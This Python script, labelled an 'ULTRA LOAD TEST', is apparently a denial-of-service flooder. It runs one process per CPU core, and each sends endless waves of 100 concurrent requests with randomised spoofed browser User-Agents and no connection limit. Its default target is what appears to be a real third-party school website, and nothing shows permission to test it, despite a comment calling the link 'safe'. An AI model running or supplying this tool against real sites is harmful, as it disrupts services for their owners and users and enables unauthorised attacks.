import asyncio
import os
import random
import sys
import logging
import signal
from typing import List
import aiohttp

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] (Process-%(process)d) %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Default value updated to a safe testing live link
TARGET_URL: str = os.getenv("TARGET_URL", "https://geetainternationalschool.in")
BATCH_SIZE: int = int(os.getenv("BATCH_SIZE", "100"))

def generate_random_user_agent() -> str:
    os_systems = [
        f"Windows NT 10.0; Win64; x64",
        f"Windows NT 11.0; Win64; x64",
        f"Macintosh; Intel Mac OS X 10_15_{random.randint(5, 7)}",
        f"Macintosh; Intel Mac OS X 11_{random.randint(1, 6)}_{random.randint(0, 5)}",
        f"X11; Linux x86_64",
        f"iPhone; CPU iPhone OS {random.randint(15, 17)}_{random.randint(0, 5)} like Mac OS X"
    ]
    chrome_version = f"{random.randint(115, 125)}.0.{random.randint(5000, 6000)}.{random.randint(10, 150)}"
    safari_version = f"{random.randint(537, 605)}.{random.randint(1, 36)}"
    browsers = [
        f"Mozilla/5.0 ({random.choice(os_systems)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36",
        f"Mozilla/5.0 ({random.choice(os_systems)}) AppleWebKit/{safari_version} (KHTML, like Gecko) Version/{random.randint(15, 17)}.{random.randint(0,4)} Mobile/15E148 Safari/{safari_version}"
    ]
    return random.choice(browsers)

async def fetch(session: aiohttp.ClientSession, url: str) -> str:
    headers = {
        "User-Agent": generate_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }
    try:
        async with session.get(url, headers=headers, timeout=5, allow_redirects=True) as response:
            return str(response.status)
    except asyncio.TimeoutError:
        return "Timeout"
    except Exception:
        return "Failed"

async def async_worker(url: str, batch_size: int, worker_id: int) -> None:
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        loop_count = 1
        while True:
            try:
                tasks = [fetch(session, url) for _ in range(batch_size)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                success = results.count("200")
                timeouts = results.count("Timeout")
                failed = results.count("Failed")
                other = len(results) - success - timeouts - failed
                
                logger.info(
                    f"[Worker {worker_id} - Wave {loop_count}] Sent: {batch_size} | "
                    f"OK: {success} | Timeout: {timeouts} | Fail: {failed} | Other: {other}"
                )
                loop_count += 1
                await asyncio.sleep(0.1)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Error in worker {worker_id}: {e}")
                await asyncio.sleep(1)

def start_multiprocessing_core(url: str, batch_size: int, worker_id: int) -> None:
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    try:
        asyncio.run(async_worker(url, batch_size, worker_id))
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    import multiprocessing
    cpu_cores = multiprocessing.cpu_count()
    logger.info(f"🚀 STARTING ULTRA LOAD TEST ON: {TARGET_URL} | Cores: {cpu_cores}")
    processes = []
    
    def handle_exit(signum, frame):
        for p in processes:
            if p.is_alive(): p.terminate()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    try:
        for i in range(cpu_cores):
            p = multiprocessing.Process(target=start_multiprocessing_core, args=(TARGET_URL, BATCH_SIZE, i + 1), daemon=True)
            processes.append(p)
            p.start()
        for p in processes: p.join()
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
                
